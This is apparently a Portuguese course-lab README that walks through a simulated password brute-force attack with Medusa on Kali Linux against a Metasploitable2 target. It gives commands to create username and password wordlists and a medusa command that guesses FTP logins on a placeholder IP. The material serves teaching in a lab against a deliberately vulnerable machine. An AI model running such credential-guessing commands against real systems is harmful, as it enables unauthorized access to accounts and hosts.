# Ataque-de-Brute-Force-de-Senhas-com-Medusa-e-Kali-Linux
Simulando um Ataque de Brute Force de Senhas com Medusa e Kali Linux no curso Santander - Cibersegurança 2025 da DIO

REQUISITOS:
Ter instalado o linux seja ele pelo VirtualBox ou se ter no sistema operacional da máquina.

Ter instalado o Metasploitable2 para servir como a máquina que será atacada

NO LINUX QUE VAI INVADIR:
COMANDO PARA CRIAR UMA LISTA DE USUÁRIOS:
echo -e 'users\nmsfadmin\nadmin\nroot' > users.txt

COMANDO PARA CRIAR UMA LISTA DE SENHAS:
echo -e '123456\nmsfadmin\nadmin\nroot' > pass.txt

COMANDO PARA USAR PARA TESTAR DIFERENTES USUARIOS E SENHAS:
medusa -h IP_DA_MAQUINA_A_SER_INVADIDA -U users.txt -P pass.txt -M ftp -t 6
